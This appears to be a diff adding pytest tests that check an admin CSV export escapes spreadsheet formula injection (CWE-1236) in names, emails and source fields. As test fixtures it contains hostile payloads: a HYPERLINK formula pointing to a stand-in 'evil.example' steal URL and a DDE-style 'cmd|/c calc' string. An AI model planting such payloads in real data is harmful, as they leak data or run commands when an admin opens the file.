@@ -115,3 +115,65 @@ def test_unsupported_export_kind_400(db):
     with pytest.raises(Exception) as exc:
         asyncio.run(admin_export_csv("bogus", from_date=None, to_date=None, db=db, current_user=admin))
     assert getattr(exc.value, "status_code", None) == 400
+
+
+# ── CSV/formula injection (CWE-1236) ──────────────────────────────────────
+# applications/newsletter source fields from unauthenticated public forms
+# (quick-apply, newsletter signup) — a value starting with =, +, -, @, tab,
+# or CR/LF must never reach the exported cell unescaped, since Excel/Sheets
+# evaluate it as a live formula when an admin opens the file.
+
+def test_applications_export_neutralises_formula_injection_in_full_name(db):
+    admin = _make_admin(db)
+    owner = User(id=str(uuid.uuid4()), email="owner4@x.com", full_name="Owner", password_hash="x", role=UserRole.company)
+    db.add(owner)
+    db.flush()
+    company = Company(owner_user_id=owner.id, name="Acme", status="active")
+    db.add(company)
+    db.flush()
+    db.add(JobApplication(
+        job_id=str(uuid.uuid4()), company_id=company.id,
+        applicant_full_name='=HYPERLINK("http://evil.example/steal","x")',
+        applicant_email="attacker@x.com", status="submitted",
+    ))
+    db.commit()
+
+    response = asyncio.run(admin_export_csv("applications", from_date=None, to_date=None, db=db, current_user=admin))
+    body = response.body.decode("utf-8")
+
+    # The cell must not start with '=' (a live formula trigger) — it must be
+    # prefixed with a quote that forces spreadsheet apps to treat it as text.
+    assert ',"\'=HYPERLINK' in body
+    assert ',=HYPERLINK' not in body
+
+
+def test_newsletter_export_neutralises_formula_injection_in_email(db):
+    admin = _make_admin(db)
+    # A formula-shaped local part like this still matches the app's basic
+    # email-format regex, so it can genuinely reach storage.
+    db.add(NewsletterSubscriber(email="=2+2@x.com", source="+SUM(A1:A9)"))
+    db.commit()
+
+    response = asyncio.run(admin_export_csv("newsletter", from_date=None, to_date=None, db=db, current_user=admin))
+    body = response.body.decode("utf-8")
+
+    assert "\n=2+2@x.com" not in body and ",=2+2@x.com" not in body
+    assert "'=2+2@x.com" in body
+    assert "'+SUM(A1:A9)" in body
+
+
+def test_csv_safe_cell_leaves_ordinary_values_untouched():
+    from app.api.v1.admin import _csv_safe_cell
+
+    assert _csv_safe_cell("Ana Sousa") == "Ana Sousa"
+    assert _csv_safe_cell(42) == 42
+    assert _csv_safe_cell(True) is True
+    assert _csv_safe_cell(None) is None
+
+
+@pytest.mark.parametrize("trigger", ["=", "+", "-", "@", "\t", "\r", "\n"])
+def test_csv_safe_cell_quotes_every_formula_trigger_character(trigger):
+    from app.api.v1.admin import _csv_safe_cell
+
+    payload = f"{trigger}cmd|'/c calc'!A0"
+    assert _csv_safe_cell(payload) == "'" + payload
